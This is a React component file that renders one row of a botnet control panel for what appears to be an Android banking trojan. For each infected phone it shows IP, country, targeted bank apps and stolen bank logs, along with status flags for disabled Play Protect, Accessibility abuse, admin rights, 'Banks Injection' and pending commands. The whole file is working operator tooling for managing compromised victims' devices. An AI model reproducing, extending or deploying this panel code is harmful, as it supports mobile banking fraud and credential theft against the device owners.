import React from 'react';
import { isNullOrUndefined } from 'util';
import SettingsContext from '../../Settings';
import { try_eval } from '../../serviceF';
import EditCommentUniversal from '../EditCommentUniversal';
import moment from 'moment-timezone';

class BotsRow extends React.Component {

    state = {
        botId: "UNKNOWN UID",
        botAndroidVersion: "0.0.0",
        botTagsList: "NaN",
        botCountry: "not",
        botBanks: "",
        statProtect: 0,
        statScreen: 0,
        statAccessibility: 0,
        statModule: 0,
        statBanks: 0,
        statAdmin: 0,
        operator: "",
        botLastActivity: "Unknown",
        comment: "",
        botAddDate: "Unknown Date",
        botIp: '0.0.0.0',
        WaitCommand: '',
	logs: [],
        checked: false // Статус выбран ли этот бот (чекбокс)
    };

   // audio = new Audio("/sound.ogg");

    updateBotInfo = () => {
	//let temp = {...this.state};
        if(!isNullOrUndefined(this.props.botId)) {
            this.state.botId = this.props.botId;
            this.state.checked = (SettingsContext.SelectedBots.indexOf(this.props.botId) > -1);
        }

        // Имена пропсов, которые надо загнать в стейт (если они есть)
        let names = ['botAndroidVersion','botTagsList','botCountry','botBanks',
            'statProtect','statScreen','statAccessibility',
            'statBanks','statModule','statAdmin','comment',
            'botLastActivity','botAddDate','botIp','WaitCommand', 'operator', 'logs'];
        
        for(let name of names) {
            if(!isNullOrUndefined(this.props[name]))
                this.state[name] = this.props[name];
        }

	//this.setState({...temp});
    }

    toggleChange = () => {
        let botid = this.state.botId;
        let checkbox_status = (SettingsContext.SelectedBots.indexOf(botid) > -1);
        if(!checkbox_status) {
            SettingsContext.SelectedBots.push(botid);
            this.setState({checked: true});
        }
        else {
            SettingsContext.SelectedBots.remove(botid);
            this.setState({checked: false});
        }
    }

    lastActivityCalc() {
        if(this.state.botLastActivity < 10) {
            return "<span style='color:#00d400;'>Now</span>";
        }
        if(this.state.botLastActivity < 60) {
            return "<span style='color:#00d400;'>" + this.state.botLastActivity + "s</span>";
        }
        else if(this.state.botLastActivity < 3600) {
            return "<span style='color:#efef00;'>" + parseInt(this.state.botLastActivity/60) + "m</span>";
        }
        else if(this.state.botLastActivity < 86400) {
            return "<span style='color:#ff9800;'>" + parseInt(this.state.botLastActivity/60/60) + "h</span>";
        }
        else {
            return "<span style='color:#f00000;'>" + parseInt(this.state.botLastActivity/60/60/24) + "d</span>";
        }
    }

    ServicesIcons() {
        let html = "<center style='line-height: 23px; font-size: 18px;'>";
        
        // USER LOOK AT SCREEN
        if(Number(this.state.statScreen) === 1) {
            html += "<i class=\"fa-yellow far fa-eye\" data-placement=\"bottom\" data-toggle=\"tooltip\" title=\"User looks at the screen\"></i>";
        }
        else {
            html += "<i class=\"fa-green far fa-eye-slash\" data-placement=\"bottom\" data-toggle=\"tooltip\" title=\"User does not look at the screen\"></i>";
        }
        html += ' ';

        // ACCESIBILITY STATUS
        if(Number(this.state.statAccessibility) === 1) {
            html += "<i class=\"fa-green fas fa-universal-access\" data-placement=\"bottom\" data-toggle=\"tooltip\" title=\"Accessibility enabled\"></i>";
        }
        else {
            html += "<i class=\"fa-yellow fal fa-universal-access\" data-placement=\"bottom\" data-toggle=\"tooltip\" title=\"Accessibility disabled\"></i>";
        }
        html += ' ';

        // ADMIN RIGHTS STATUS
        if(Number(this.state.statAdmin) === 1) {
            html += "<i class=\"fa-green fas fa-route-highway\" data-placement=\"bottom\" data-toggle=\"tooltip\" title=\"There are admin rights\"></i>";
        }
        else {
            html += "<i class=\"fa-gray fas fa-route-highway\" data-placement=\"bottom\" data-toggle=\"tooltip\" title=\"no admin rights\"></i>";
        }
        html += ' ';

        // PROTECT STATUS
        if(Number(this.state.statProtect) === 0) {
            html += "<i class=\"fa-green far fa-shield\" data-placement=\"bottom\" data-toggle=\"tooltip\" title=\"Play Protect disabled\"></i>";
        }
        else if(Number(this.state.statProtect) === 2) {
            html += "<i class=\"fa-yellow fas fa-shield-alt\" data-placement=\"bottom\" data-toggle=\"tooltip\" title=\"Play Protect status not defined\"></i>";
        }
        else {
            html += "<i class=\"fa-gray fas fa-shield-check\" data-placement=\"bottom\" data-toggle=\"tooltip\" title=\"Play Protect enabled\"></i>";
        }
        html += ' ';

        // NEXT BLOCK
        // html += '<br>';

        // BANK INJECT STATUS
        if(Number(this.state.statBanks) === 1) {
            html += "<i class=\"fa-green fas fa-usd-circle\" data-placement=\"bottom\" data-toggle=\"tooltip\" title=\"Banks Injection Triggered\"></i>";
        }
        else {
            html += "<i class=\"fa-yellow fal fa-usd-circle\" data-placement=\"bottom\" data-toggle=\"tooltip\" title=\"Banks Injection not Triggered\"></i>";
        }
        html += ' ';

        // MODULE STATUS
        if(Number(this.state.statModule) === 1) {
            html += "<i class=\"fa-green fab fa-mandalorian\" data-placement=\"bottom\" data-toggle=\"tooltip\" title=\"Module loaded\"></i>";
        }
        else {
            html += "<i class=\"fa-gray fab fa-mandalorian\" data-placement=\"bottom\" data-toggle=\"tooltip\" title=\"Module not loaded\"></i>";
        }

        html += '</center>';

        return html;
    }

    FaCheckBox() {
        return this.state.checked ? 'far fa-check-square' : 'far fa-square';
    }

    BanksCount(list)
    {
        try {
            return (list.split(':').length - 1).toString();
        }
        catch (err) {
            return err.toString();
        }
    }

    BanksLogCheck(bank) {
        let log = this.state.logs.filter(lo => lo.application === bank);
        if (log.length) {
            return log[0];
        }
        return false;
    }

    ChangeDefaultComment(newComment) {
        this.setState({
            comment: newComment
        });
    }

    render () {
        this.updateBotInfo();
        /* const td = {
            padding: '0px'
        }; */
        /* const tdw = {
            width: '78px'
        } */
        const CenterA = {
            textAlign: 'center',
            verticalAlign: 'middle',
            padding: '0px'
        }
        const BankStyle = {
            textAlign: 'center',
            fontSize: '18px',
            lineHeight: '48px'
        }
        let CommentStyle = {
            paddingTop: "1rem"
        }

        let botData = this.state.botAddDate
        if (botData !== "Unknown Date") {
            var m = moment.utc(botData, "YYYY-MM-DD HH:mm");
            var tz = 'Europe/Istanbul'; // example value, you can use moment.tz.guess()
            botData = m.clone().tz(tz).format("YYYY-MM-DD HH:mm");
            botData = <>{botData.split(' ')[0]}<br />{botData.split(' ')[1]}</>
        }

	//audio.play();

        return (
            <tr class={this.state.checked ? "checkedbotrow" : ""}>
                <td>
                    <div class="check-bot text-right">
                    {this.state.WaitCommand === '' ? '' : <i data-placement="bottom" data-toggle="tooltip" title="Bot executes the command" class="far fa-terminal mr-2"></i>}
                    <i class={this.FaCheckBox()} onClick={this.toggleChange.bind(this)} />
                    <i class="space-left far fa-info-circle" onClick={() => {
                        SettingsContext.CurrentSetBot = "";
                        SettingsContext.CurrentSetBot = this.state.botId;
                        try_eval('$("#BotInfoModal").modal("show");');
                        this.props.BotListForceUpdate();
                    }} />
                    <i class="space-left fal fa-cog" onClick={() => {
                        SettingsContext.CurrentSetBot = "";
                        SettingsContext.CurrentSetBot = this.state.botId;
                        try_eval('$("#BotSettingsModal").modal("show");');
                        this.props.BotListForceUpdate();
                    }} />
                    </div>
                </td>
                <td>
                    {this.state.botId}
                    <br/>
                    <div  dangerouslySetInnerHTML={{__html:this.ServicesIcons()}} />
                </td>
                <td style={CenterA}>
                    {this.state.botCountry && <img src={"/img/flag/" + this.state.botCountry + ".png"} alt={this.state.botCountry} />}
                    <br />
                    {this.state.botIp}
                </td>
                <td style={CenterA}>{this.state.botTagsList}</td>
                <td style={CenterA} dangerouslySetInnerHTML={{__html:this.lastActivityCalc()}} />
                <td style={CenterA}>Android {this.state.botAndroidVersion}</td>
                {/* <td scope="col" style={td} dangerouslySetInnerHTML={{__html:this.ServicesIcons()}}/> */}
                <td style={{ ...BankStyle, textAlign: "left", paddingLeft: "2rem" }}>{this.state.botBanks ? this.state.botBanks.split(":").map((el, index) => (
                    el.trim() ? <p key={index} style={{ fontSize: "12px", margin: 0, minWidth: 200 }}><i class={`far fa-landmark mr-2 ${this.BanksLogCheck(el) ? "fa-green" : "fa-white"}`} style={{ cursor: this.BanksLogCheck(el) ? "pointer" : "default" }} onClick={() => {
                        if (this.BanksLogCheck(el) === false) {
                            return;
                        }
                        SettingsContext.CurrentSetBot = "";
                        SettingsContext.CurrentSetBot = this.state.botId;
                        SettingsContext.CurrentSetBank = this.BanksLogCheck(el) ? this.BanksLogCheck(el)['application'] : "";
                        try_eval('$("#BankLogModal").modal("show");');
                        this.props.BotListForceUpdate();

                    }} />{el}</p> : null
                )) : ''}</td>
                <td style={CenterA}>{this.state.operator}</td>
                {/* <td scope="col" style={CenterA}>{this.state.botIp}</td> */}
                <td style={{...CenterA, fontSize: "80%"}}>{botData}</td>
                <td style={CommentStyle}><EditCommentUniversal parentObj={this} idbot={this.state.botId} text={this.state.comment} request="editComment" /></td>
                {/* <td scope="col" style={({width:'0px', color:'#47ad00'})}>{this.state.WaitCommand == '' ? '' : <i  data-placement="bottom" data-toggle="tooltip" title="Bot executes the command" class="far fa-terminal"></i>}</td> */}
            </tr>
        );
    }
}

export default BotsRow;
